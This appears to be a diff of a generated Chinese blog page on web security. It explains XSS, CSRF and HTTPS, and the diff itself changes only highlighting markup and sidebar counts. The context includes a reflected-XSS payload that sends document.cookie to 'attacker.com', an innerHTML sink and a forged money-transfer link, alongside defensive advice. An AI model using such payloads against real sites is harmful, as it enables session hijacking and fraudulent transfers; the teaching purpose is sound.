@@ -384,13 +384,13 @@
 <p>加入请求URL和反射XSS相同:</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//support.kefu.mi.com?msg=</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> i=<span class="keyword">new</span> Image;</span><br><span class="line">i.src=<span class="string">"http://attacker.com/"</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 <p>显示页面如下：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;input id=<span class="string">"msg"</span> type=<span class="string">"text"</span> value=<span class="string">"$&#123;msg&#125;"</span> /&gt;</span><br><span class="line">&lt;div id=<span class="string">"show"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="keyword">var</span> msg = <span class="built_in">document</span>.getElementById(<span class="string">"msg"</span>); </span><br><span class="line"><span class="keyword">var</span> show = <span class="built_in">document</span>.getElementById(<span class="string">"show"</span>);</span><br><span class="line">show.innerHTML = msg.value;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;input id=<span class="string">"msg"</span> type=<span class="string">"text"</span> value=<span class="string">"$&#123;msg&#125;"</span> /&gt;</span><br><span class="line">&lt;div id=<span class="string">"show"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="keyword">var</span> msg = <span class="built_in">document</span>.getElementById(<span class="string">"msg"</span>); </span><br><span class="line"><span class="keyword">var</span> show = <span class="built_in">document</span>.getElementById(<span class="string">"show"</span>);</span><br><span class="line">show.innerHTML = msg.value;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 <p>防御XSS最佳的做法是对数据进行严格的输出编码，使得攻击者提供的数据不再被浏览器认为是脚本而被误执行。</p>
 <h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><p>CSRF称为跨站请求伪造，全称是Cross Site Request Forgery，它可以在受害者毫不知情的情况下，以受害者的名义伪造请求发送给受攻击站点。</p>
 <p>场景说明：小米金融网站A，有一个如下的转账接口</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//jr.mi.com/transfer?to=dongqingqing&amp;money=1000000000000</span></span><br></pre></td></tr></table></figure>
 <p>黑客H有一个网站B，在网站中放入如下代码，通过广告诱使受害者点击。如果受害者之前登录过网站A，且session还未过期，就会在受害者不知情的情况下，成功转账给黑客。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">'http://jr.mi.com/transfer?to=dongqingqing&amp;money=1000000000000'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">'http://jr.mi.com/transfer?to=dongqingqing&amp;money=1000000000000'</span>&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
 <p>可以通过验证HTTP Referer字段、在请求地址中添加token并验证、在HTTP头中自定义属性并验证等方法进行解决；</p>
 <h4 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h4><p>建议所有对外网开放的站点都通过HTTPS，它是在HTTP协议的基础上，加入了SSL层，对数据进行加密处理。</p>
 <p>通过HTTPS协议，cookie在传输的过程中，即使被别人劫持到请求，也不知道实际的cookie是什么，无法伪造其他的请求。</p>
@@ -550,7 +550,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-count">25</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -561,7 +561,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">9</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -572,7 +572,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">18</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
